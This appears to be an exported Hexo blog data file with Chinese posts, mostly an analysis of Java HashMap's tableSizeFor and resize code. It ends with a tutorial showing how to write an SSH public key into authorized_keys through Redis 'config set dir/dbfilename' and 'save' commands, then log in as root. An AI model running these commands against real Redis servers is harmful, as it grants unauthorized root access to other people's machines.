a|b`及交换律得到一个推论： \n```\n若a = n>>>0|n>>>1|n>>>2|n>>>3|....|n>>>(2的k次方-1) ，那么a | a >>> (2的k次方) = n >>> (2的k+1次方 - 1)\n```\n所以上面的`n>>>1`到`n>>>16`部分的代码计算相当于求 `n|n>>>1|n>>>2|n>>>3|...|n>>>31`(n取原始值），即得到的数为二进制包含最高位以下的位全部置1，例如：若n=15=0b1111，最终得到0b1111=15；若n=12=0b1100，最终得到0b1111=15；若n=0b0101，最终得到0b0111=7\n\n\n## resize方法\n```\nfinal Node<K,V>[] resize() {\n        Node<K,V>[] oldTab = table;\n        int oldCap = (oldTab == null) ? 0 : oldTab.length;\n        int oldThr = threshold;\n        int newCap, newThr = 0;\n        if (oldCap > 0) {\n            if (oldCap >= MAXIMUM_CAPACITY) {  // 实际数量超过Integer.MAX_VALUE的一半，数组的容量设为Integer.MAX_VALUE\n                threshold = Integer.MAX_VALUE;\n                return oldTab;\n            }\n            // 数组容量翻倍，并且旧的容量不小于于初始容量时，同时也将阈值翻倍\n            else if ((newCap = oldCap << 1) < MAXIMUM_CAPACITY &&\n                     oldCap >= DEFAULT_INITIAL_CAPACITY)\n                newThr = oldThr << 1; // double threshold\n        }\n        else if (oldThr > 0) // 新建类时有设置阈值但没设置数组容量，则以阈值作为容量\n            newCap = oldThr;\n        else {               // 新建时什么都没有设置，给默认值：16 和 16 * 0.75\n            newCap = DEFAULT_INITIAL_CAPACITY;\n            newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);\n        }\n        if (newThr == 0) { // 检查阈值设置，未设置时由 容量阈值比和容量乘积计算\n            float ft = (float)newCap * loadFactor;\n            newThr = (newCap < MAXIMUM_CAPACITY && ft < (float)MAXIMUM_CAPACITY ?\n                      (int)ft : Integer.MAX_VALUE);\n        }\n        threshold = newThr;\n        @SuppressWarnings({\"rawtypes\",\"unchecked\"})\n            Node<K,V>[] newTab = (Node<K,V>[])new Node[newCap];\n        table = newTab;\n        // 扩容后重新放置节点\n        if (oldTab != null) {\n            for (int j = 0; j < oldCap; ++j) {\n                Node<K,V> e;\n                if ((e = oldTab[j]) != null) {\n                    oldTab[j] = null;\n                    if (e.next == null) // 数组位置的树只有一个节点，扩容后，新位置当然也只有一个节点\n                        newTab[e.hash & (newCap - 1)] = e;\n                    else if (e instanceof TreeNode) // 数组+树结构时，执行树的分割\n                        ((TreeNode<K,V>)e).split(this, newTab, j, oldCap);\n                    else { // 数组+链表时，链表分割为两份，直接比较扩容后(capacity - 1)的值新增加的那一位即可知道分割到哪一部分\n                        Node<K,V> loHead = null, loTail = null;    // 分割到低位上的节点的头与尾\n                        Node<K,V> hiHead = null, hiTail = null;    // 分割到高位上的节点的头和尾\n                        Node<K,V> next;\n                        do {\n                            next = e.next;\n                            if ((e.hash & oldCap) == 0) { // hash值对应于新扩容后的位（oldCap刚好是新扩容的长度的新增位，实际上应写为(newCap - 1 - (oldCap - 1))的值，由于刚好等于oldCap所以就减少了计算）的值是0，分割到0值的那一部分\n                                if (loTail == null)\n                                    loHead = e;\n                                else\n                                    loTail.next = e;\n                                loTail = e;\n                            }\n                            else {   // hash值对应于(newCap - 1)的新的位的值为1，分割到1值的那一部分\n                                if (hiTail == null)\n                                    hiHead = e;\n                                else\n                                    hiTail.next = e;\n                                hiTail = e;\n                            }\n                        } while ((e = next) != null);\n                        if (loTail != null) {\n                            loTail.next = null;\n                            newTab[j] = loHead;\n                        }\n                        if (hiTail != null) {\n                            hiTail.next = null;\n                            newTab[j + oldCap] = hiHead;\n                        }\n                    }\n                }\n            }\n        }\n        return newTab;\n    }\n```\n\n## TreeNode结构\nHashMap在数据量较小时，使用的数组+链表的结构，当数据量较大时使用数组+树的结构。由数组+链表到数组+树的结构的转化，在于`treeifyBin`方法。当链表的长度大于7时，会触发`treeifyBin`方法判断是否转变存储结构，当数组的长度也大于63时，即会使该hash值的链表结构变更为树结构。","slug":"source-hashmap","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi0670019g0uk6ausihk1","content":"<h2 id=\"tableSizeFor方法\"><a href=\"#tableSizeFor方法\" class=\"headerlink\" title=\"tableSizeFor方法\"></a>tableSizeFor方法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static final int tableSizeFor(int cap) &#123;</span><br><span class=\"line\">        int n = cap - 1;</span><br><span class=\"line\">        n |= n &gt;&gt;&gt; 1;</span><br><span class=\"line\">        n |= n &gt;&gt;&gt; 2;</span><br><span class=\"line\">        n |= n &gt;&gt;&gt; 4;</span><br><span class=\"line\">        n |= n &gt;&gt;&gt; 8;</span><br><span class=\"line\">        n |= n &gt;&gt;&gt; 16;</span><br><span class=\"line\">        return (n &lt; 0) ? 1 : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>由公式：<code>(a|b)&gt;&gt;&gt;k = (a&gt;&gt;&gt;k)|(b&gt;&gt;&gt;k)</code> 及<code>a|b|b = a|b</code>及交换律得到一个推论： </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">若a = n&gt;&gt;&gt;0|n&gt;&gt;&gt;1|n&gt;&gt;&gt;2|n&gt;&gt;&gt;3|....|n&gt;&gt;&gt;(2的k次方-1) ，那么a | a &gt;&gt;&gt; (2的k次方) = n &gt;&gt;&gt; (2的k+1次方 - 1)</span><br></pre></td></tr></table></figure>\n\n<p>所以上面的<code>n&gt;&gt;&gt;1</code>到<code>n&gt;&gt;&gt;16</code>部分的代码计算相当于求 <code>n|n&gt;&gt;&gt;1|n&gt;&gt;&gt;2|n&gt;&gt;&gt;3|...|n&gt;&gt;&gt;31</code>(n取原始值），即得到的数为二进制包含最高位以下的位全部置1，例如：若n=15=0b1111，最终得到0b1111=15；若n=12=0b1100，最终得到0b1111=15；若n=0b0101，最终得到0b0111=7</p>\n<h2 id=\"resize方法\"><a href=\"#resize方法\" class=\"headerlink\" title=\"resize方法\"></a>resize方法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">final Node&lt;K,V&gt;[] resize() &#123;</span><br><span class=\"line\">        Node&lt;K,V&gt;[] oldTab = table;</span><br><span class=\"line\">        int oldCap = (oldTab == null) ? 0 : oldTab.length;</span><br><span class=\"line\">        int oldThr = threshold;</span><br><span class=\"line\">        int newCap, newThr = 0;</span><br><span class=\"line\">        if (oldCap &gt; 0) &#123;</span><br><span class=\"line\">            if (oldCap &gt;= MAXIMUM_CAPACITY) &#123;  // 实际数量超过Integer.MAX_VALUE的一半，数组的容量设为Integer.MAX_VALUE</span><br><span class=\"line\">                threshold = Integer.MAX_VALUE;</span><br><span class=\"line\">                return oldTab;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            // 数组容量翻倍，并且旧的容量不小于于初始容量时，同时也将阈值翻倍</span><br><span class=\"line\">            else if ((newCap = oldCap &lt;&lt; 1) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class=\"line\">                     oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class=\"line\">                newThr = oldThr &lt;&lt; 1; // double threshold</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else if (oldThr &gt; 0) // 新建类时有设置阈值但没设置数组容量，则以阈值作为容量</span><br><span class=\"line\">            newCap = oldThr;</span><br><span class=\"line\">        else &#123;               // 新建时什么都没有设置，给默认值：16 和 16 * 0.75</span><br><span class=\"line\">            newCap = DEFAULT_INITIAL_CAPACITY;</span><br><span class=\"line\">            newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if (newThr == 0) &#123; // 检查阈值设置，未设置时由 容量阈值比和容量乘积计算</span><br><span class=\"line\">            float ft = (float)newCap * loadFactor;</span><br><span class=\"line\">            newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (float)MAXIMUM_CAPACITY ?</span><br><span class=\"line\">                      (int)ft : Integer.MAX_VALUE);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        threshold = newThr;</span><br><span class=\"line\">        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br><span class=\"line\">            Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])new Node[newCap];</span><br><span class=\"line\">        table = newTab;</span><br><span class=\"line\">        // 扩容后重新放置节点</span><br><span class=\"line\">        if (oldTab != null) &#123;</span><br><span class=\"line\">            for (int j = 0; j &lt; oldCap; ++j) &#123;</span><br><span class=\"line\">                Node&lt;K,V&gt; e;</span><br><span class=\"line\">                if ((e = oldTab[j]) != null) &#123;</span><br><span class=\"line\">                    oldTab[j] = null;</span><br><span class=\"line\">                    if (e.next == null) // 数组位置的树只有一个节点，扩容后，新位置当然也只有一个节点</span><br><span class=\"line\">                        newTab[e.hash &amp; (newCap - 1)] = e;</span><br><span class=\"line\">                    else if (e instanceof TreeNode) // 数组+树结构时，执行树的分割</span><br><span class=\"line\">                        ((TreeNode&lt;K,V&gt;)e).split(this, newTab, j, oldCap);</span><br><span class=\"line\">                    else &#123; // 数组+链表时，链表分割为两份，直接比较扩容后(capacity - 1)的值新增加的那一位即可知道分割到哪一部分</span><br><span class=\"line\">                        Node&lt;K,V&gt; loHead = null, loTail = null;    // 分割到低位上的节点的头与尾</span><br><span class=\"line\">                        Node&lt;K,V&gt; hiHead = null, hiTail = null;    // 分割到高位上的节点的头和尾</span><br><span class=\"line\">                        Node&lt;K,V&gt; next;</span><br><span class=\"line\">                        do &#123;</span><br><span class=\"line\">                            next = e.next;</span><br><span class=\"line\">                            if ((e.hash &amp; oldCap) == 0) &#123; // hash值对应于新扩容后的位（oldCap刚好是新扩容的长度的新增位，实际上应写为(newCap - 1 - (oldCap - 1))的值，由于刚好等于oldCap所以就减少了计算）的值是0，分割到0值的那一部分</span><br><span class=\"line\">                                if (loTail == null)</span><br><span class=\"line\">                                    loHead = e;</span><br><span class=\"line\">                                else</span><br><span class=\"line\">                                    loTail.next = e;</span><br><span class=\"line\">                                loTail = e;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                            else &#123;   // hash值对应于(newCap - 1)的新的位的值为1，分割到1值的那一部分</span><br><span class=\"line\">                                if (hiTail == null)</span><br><span class=\"line\">                                    hiHead = e;</span><br><span class=\"line\">                                else</span><br><span class=\"line\">                                    hiTail.next = e;</span><br><span class=\"line\">                                hiTail = e;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125; while ((e = next) != null);</span><br><span class=\"line\">                        if (loTail != null) &#123;</span><br><span class=\"line\">                            loTail.next = null;</span><br><span class=\"line\">                            newTab[j] = loHead;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        if (hiTail != null) &#123;</span><br><span class=\"line\">                            hiTail.next = null;</span><br><span class=\"line\">                            newTab[j + oldCap] = hiHead;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return newTab;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"TreeNode结构\"><a href=\"#TreeNode结构\" class=\"headerlink\" title=\"TreeNode结构\"></a>TreeNode结构</h2><p>HashMap在数据量较小时，使用的数组+链表的结构，当数据量较大时使用数组+树的结构。由数组+链表到数组+树的结构的转化，在于<code>treeifyBin</code>方法。当链表的长度大于7时，会触发<code>treeifyBin</code>方法判断是否转变存储结构，当数组的长度也大于63时，即会使该hash值的链表结构变更为树结构。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"tableSizeFor方法\"><a href=\"#tableSizeFor方法\" class=\"headerlink\" title=\"tableSizeFor方法\"></a>tableSizeFor方法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static final int tableSizeFor(int cap) &#123;</span><br><span class=\"line\">        int n = cap - 1;</span><br><span class=\"line\">        n |= n &gt;&gt;&gt; 1;</span><br><span class=\"line\">        n |= n &gt;&gt;&gt; 2;</span><br><span class=\"line\">        n |= n &gt;&gt;&gt; 4;</span><br><span class=\"line\">        n |= n &gt;&gt;&gt; 8;</span><br><span class=\"line\">        n |= n &gt;&gt;&gt; 16;</span><br><span class=\"line\">        return (n &lt; 0) ? 1 : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + 1;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>由公式：<code>(a|b)&gt;&gt;&gt;k = (a&gt;&gt;&gt;k)|(b&gt;&gt;&gt;k)</code> 及<code>a|b|b = a|b</code>及交换律得到一个推论： </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">若a = n&gt;&gt;&gt;0|n&gt;&gt;&gt;1|n&gt;&gt;&gt;2|n&gt;&gt;&gt;3|....|n&gt;&gt;&gt;(2的k次方-1) ，那么a | a &gt;&gt;&gt; (2的k次方) = n &gt;&gt;&gt; (2的k+1次方 - 1)</span><br></pre></td></tr></table></figure>\n\n<p>所以上面的<code>n&gt;&gt;&gt;1</code>到<code>n&gt;&gt;&gt;16</code>部分的代码计算相当于求 <code>n|n&gt;&gt;&gt;1|n&gt;&gt;&gt;2|n&gt;&gt;&gt;3|...|n&gt;&gt;&gt;31</code>(n取原始值），即得到的数为二进制包含最高位以下的位全部置1，例如：若n=15=0b1111，最终得到0b1111=15；若n=12=0b1100，最终得到0b1111=15；若n=0b0101，最终得到0b0111=7</p>\n<h2 id=\"resize方法\"><a href=\"#resize方法\" class=\"headerlink\" title=\"resize方法\"></a>resize方法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">final Node&lt;K,V&gt;[] resize() &#123;</span><br><span class=\"line\">        Node&lt;K,V&gt;[] oldTab = table;</span><br><span class=\"line\">        int oldCap = (oldTab == null) ? 0 : oldTab.length;</span><br><span class=\"line\">        int oldThr = threshold;</span><br><span class=\"line\">        int newCap, newThr = 0;</span><br><span class=\"line\">        if (oldCap &gt; 0) &#123;</span><br><span class=\"line\">            if (oldCap &gt;= MAXIMUM_CAPACITY) &#123;  // 实际数量超过Integer.MAX_VALUE的一半，数组的容量设为Integer.MAX_VALUE</span><br><span class=\"line\">                threshold = Integer.MAX_VALUE;</span><br><span class=\"line\">                return oldTab;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            // 数组容量翻倍，并且旧的容量不小于于初始容量时，同时也将阈值翻倍</span><br><span class=\"line\">            else if ((newCap = oldCap &lt;&lt; 1) &lt; MAXIMUM_CAPACITY &amp;&amp;</span><br><span class=\"line\">                     oldCap &gt;= DEFAULT_INITIAL_CAPACITY)</span><br><span class=\"line\">                newThr = oldThr &lt;&lt; 1; // double threshold</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        else if (oldThr &gt; 0) // 新建类时有设置阈值但没设置数组容量，则以阈值作为容量</span><br><span class=\"line\">            newCap = oldThr;</span><br><span class=\"line\">        else &#123;               // 新建时什么都没有设置，给默认值：16 和 16 * 0.75</span><br><span class=\"line\">            newCap = DEFAULT_INITIAL_CAPACITY;</span><br><span class=\"line\">            newThr = (int)(DEFAULT_LOAD_FACTOR * DEFAULT_INITIAL_CAPACITY);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if (newThr == 0) &#123; // 检查阈值设置，未设置时由 容量阈值比和容量乘积计算</span><br><span class=\"line\">            float ft = (float)newCap * loadFactor;</span><br><span class=\"line\">            newThr = (newCap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; (float)MAXIMUM_CAPACITY ?</span><br><span class=\"line\">                      (int)ft : Integer.MAX_VALUE);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        threshold = newThr;</span><br><span class=\"line\">        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br><span class=\"line\">            Node&lt;K,V&gt;[] newTab = (Node&lt;K,V&gt;[])new Node[newCap];</span><br><span class=\"line\">        table = newTab;</span><br><span class=\"line\">        // 扩容后重新放置节点</span><br><span class=\"line\">        if (oldTab != null) &#123;</span><br><span class=\"line\">            for (int j = 0; j &lt; oldCap; ++j) &#123;</span><br><span class=\"line\">                Node&lt;K,V&gt; e;</span><br><span class=\"line\">                if ((e = oldTab[j]) != null) &#123;</span><br><span class=\"line\">                    oldTab[j] = null;</span><br><span class=\"line\">                    if (e.next == null) // 数组位置的树只有一个节点，扩容后，新位置当然也只有一个节点</span><br><span class=\"line\">                        newTab[e.hash &amp; (newCap - 1)] = e;</span><br><span class=\"line\">                    else if (e instanceof TreeNode) // 数组+树结构时，执行树的分割</span><br><span class=\"line\">                        ((TreeNode&lt;K,V&gt;)e).split(this, newTab, j, oldCap);</span><br><span class=\"line\">                    else &#123; // 数组+链表时，链表分割为两份，直接比较扩容后(capacity - 1)的值新增加的那一位即可知道分割到哪一部分</span><br><span class=\"line\">                        Node&lt;K,V&gt; loHead = null, loTail = null;    // 分割到低位上的节点的头与尾</span><br><span class=\"line\">                        Node&lt;K,V&gt; hiHead = null, hiTail = null;    // 分割到高位上的节点的头和尾</span><br><span class=\"line\">                        Node&lt;K,V&gt; next;</span><br><span class=\"line\">                        do &#123;</span><br><span class=\"line\">                            next = e.next;</span><br><span class=\"line\">                            if ((e.hash &amp; oldCap) == 0) &#123; // hash值对应于新扩容后的位（oldCap刚好是新扩容的长度的新增位，实际上应写为(newCap - 1 - (oldCap - 1))的值，由于刚好等于oldCap所以就减少了计算）的值是0，分割到0值的那一部分</span><br><span class=\"line\">                                if (loTail == null)</span><br><span class=\"line\">                                    loHead = e;</span><br><span class=\"line\">                                else</span><br><span class=\"line\">                                    loTail.next = e;</span><br><span class=\"line\">                                loTail = e;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                            else &#123;   // hash值对应于(newCap - 1)的新的位的值为1，分割到1值的那一部分</span><br><span class=\"line\">                                if (hiTail == null)</span><br><span class=\"line\">                                    hiHead = e;</span><br><span class=\"line\">                                else</span><br><span class=\"line\">                                    hiTail.next = e;</span><br><span class=\"line\">                                hiTail = e;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125; while ((e = next) != null);</span><br><span class=\"line\">                        if (loTail != null) &#123;</span><br><span class=\"line\">                            loTail.next = null;</span><br><span class=\"line\">                            newTab[j] = loHead;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                        if (hiTail != null) &#123;</span><br><span class=\"line\">                            hiTail.next = null;</span><br><span class=\"line\">                            newTab[j + oldCap] = hiHead;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return newTab;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"TreeNode结构\"><a href=\"#TreeNode结构\" class=\"headerlink\" title=\"TreeNode结构\"></a>TreeNode结构</h2><p>HashMap在数据量较小时，使用的数组+链表的结构，当数据量较大时使用数组+树的结构。由数组+链表到数组+树的结构的转化，在于<code>treeifyBin</code>方法。当链表的长度大于7时，会触发<code>treeifyBin</code>方法判断是否转变存储结构，当数组的长度也大于63时，即会使该hash值的链表结构变更为树结构。</p>\n"},{"title":"利用Redis写文件提权登陆linux的漏洞","date":"2019-06-13T12:36:26.000Z","keywords":"redis, vulnerability, 漏洞","rId":"MB-19061301","_content":"\n## 原理\n\n利用redis的config命令修改rdb文件地址为ssh密钥文件，向redis中写入公共密钥，通过save命令手动刷新到rdb中，此时就可以用私钥登陆了\n\n## 操作\n\n在本地电脑中（linux为例）生成无密码的密钥\n\n```\nssh-keygen -t rsa -P ''    # 后面直接回车\n```\n\n此时在~/.ssh/下生成两个文件`id_rsa`和`id_rsa.pub`，id_rsa是私钥，id_rsa_pub是公钥，公钥文件内容如下：\n\n```\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCf53Tg8bfLm8UQBFgm31YpMPuGDY3eWQ5GCiP4E7hdaSBvqSjeMjUOy5NWLg424BFWSFiKNF8oRBZpXtfhu+4AwgrwdSDJuKQtjJvrh7D+rnuxtzpGbqL/716S0e/+VHeh8PXnC+GPAMg72p7zDzHuYkvwkx/r6LSY9fspU25lHH4I9VrrxgPoS+BbU03i9LiGZFSTUSAljTJE3H5bPNpRPWlHlAZTxGXTYIGO+K2ZnUAg2+HtS246NONl6z1lVtxrS5G4yuiTeHJr+KWJD/DOiZ50EoYqbTHsjnTAM5MJTLHWH1jBIZ133OHW5RGmzyEuws6ge0Y6eGnxgwm2W09p uvince@DESKTOP-6JIM4T8\n```\n\n\n\n进入服务器的redis命令行，输入如下一系列命令(注意ssh-rsa内容前后要有回车符\\n)：\n\n```\nconfig set dir /.ssh\n\nconfig set dbfilename authorized_keys\n\nset ssh-test \"\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCf53Tg8bfLm8UQBFgm31YpMPuGDY3eWQ5GCiP4E7hdaSBvqSjeMjUOy5NWLg424BFWSFiKNF8oRBZpXtfhu+4AwgrwdSDJuKQtjJvrh7D+rnuxtzpGbqL/716S0e/+VHeh8PXnC+GPAMg72p7zDzHuYkvwkx/r6LSY9fspU25lHH4I9VrrxgPoS+BbU03i9LiGZFSTUSAljTJE3H5bPNpRPWlHlAZTxGXTYIGO+K2ZnUAg2+HtS246NONl6z1lVtxrS5G4yuiTeHJr+KWJD/DOiZ50EoYqbTHsjnTAM5MJTLHWH1jBIZ133OHW5RGmzyEuws6ge0Y6eGnxgwm2W09p uvince@DESKTOP-6JIM4T8\\n\"\n\nsave\n```\n\n此时，就已经往authorized_keys文件中写入了公钥\n\n\n\n本地电脑使用命令`ssh -i ~/.ssh/id_rsa root@10.0.2.100`能够登陆服务器，这里-i后面是私钥的路径\n\n\n\n这里面，有几个限制，一个是redis写文件的权限要能够到达该目录。现在写入的是root用户中，所以redis需要以root用户启动。如果知道某台服务器上有哪个用户，就可以把config set dir /.ssh 改为 config set dir /home/username/.ssh 了，最好还是redis和那个用户是同一个用户，这时候用config set dir ~/.ssh","source":"_posts/2019-06-13_redis_vulnerability.md","raw":"---\ntitle: 利用Redis写文件提权登陆linux的漏洞\ndate: 2019-06-13 20:36:26\ntags: vulnerability\npermalink: redis-vulnerability\nkeywords: redis, vulnerability, 漏洞\nrId: MB-19061301\n---\n\n## 原理\n\n利用redis的config命令修改rdb文件地址为ssh密钥文件，向redis中写入公共密钥，通过save命令手动刷新到rdb中，此时就可以用私钥登陆了\n\n## 操作\n\n在本地电脑中（linux为例）生成无密码的密钥\n\n```\nssh-keygen -t rsa -P ''    # 后面直接回车\n```\n\n此时在~/.ssh/下生成两个文件`id_rsa`和`id_rsa.pub`，id_rsa是私钥，id_rsa_pub是公钥，公钥文件内容如下：\n\n```\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCf53Tg8bfLm8UQBFgm31YpMPuGDY3eWQ5GCiP4E7hdaSBvqSjeMjUOy5NWLg424BFWSFiKNF8oRBZpXtfhu+4AwgrwdSDJuKQtjJvrh7D+rnuxtzpGbqL/716S0e/+VHeh8PXnC+GPAMg72p7zDzHuYkvwkx/r6LSY9fspU25lHH4I9VrrxgPoS+BbU03i9LiGZFSTUSAljTJE3H5bPNpRPWlHlAZTxGXTYIGO+K2ZnUAg2+HtS246NONl6z1lVtxrS5G4yuiTeHJr+KWJD/DOiZ50EoYqbTHsjnTAM5MJTLHWH1jBIZ133OHW5RGmzyEuws6ge0Y6eGnxgwm2W09p uvince@DESKTOP-6JIM4T8\n```\n\n\n\n进入服务器的redis命令行，输入如下一系列命令(注意ssh-rsa内容前后要有回车符\\n)：\n\n```\nconfig set dir /.ssh\n\nconfig set dbfilename authorized_keys\n\nset ssh-test \"\\nssh-rsa 